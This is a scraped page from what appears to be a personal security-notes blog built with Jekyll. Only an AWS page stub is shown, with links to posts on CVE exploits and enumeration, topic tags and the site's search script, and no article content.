  Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.


Summary


  AWS
    
      Summary
      Training
      Tools
      AWS Patterns
      AWS - Metadata S...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/CVE-Exploits/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Cve Exploits</p>
  </a>
  

  
  <a href="/Methodology-and-enumeration/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Methodology and enumeration</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

